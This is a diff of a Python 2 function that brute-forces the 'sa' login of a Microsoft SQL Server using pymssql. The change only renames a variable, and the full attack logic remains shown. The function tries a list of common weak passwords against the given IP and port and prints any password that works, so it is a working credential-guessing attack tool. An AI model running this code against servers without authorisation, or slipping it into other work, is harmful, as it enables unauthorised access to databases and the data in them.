@@ -5,7 +5,7 @@ def mssql(ip='',port='1433',name='',productname=''):
     head=''
     ans=None
     keywords=''
-    hackinfo=''
+    hackresults=''
     import pymssql,chardet
     con=None
     passwd=['root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','123',
@@ -13,21 +13,21 @@ def mssql(ip='',port='1433',name='',productname=''):
     for i in passwd:
         try:
             con = pymssql.connect(host=ip,user='sa',password=i,login_timeout=5)  
-            hackinfo= ' the password is :'+i
-            print ip+hackinfo
+            hackresults= ' the password is :'+i
+            print ip+hackresults
             keywords='mssql'
             break;
         except Exception,e:
 
             keywords='mssql'
-            hackinfo=str(e)
-            if 'sa' in hackinfo:
+            hackresults=str(e)
+            if 'sa' in hackresults:
                 print 'yes'
-            chardit1 = chardet.detect(hackinfo)
-            print hackinfo.decode(chardit1['encoding']).encode('utf8')
+            chardit1 = chardet.detect(hackresults)
+            print hackresults.decode(chardit1['encoding']).encode('utf8')
             
         finally:
             if con !=None:
                 con.close()
-    return head,ans,keywords,hackinfo
+    return head,ans,keywords,hackresults
 # print mssql(ip='192.168.1.100')
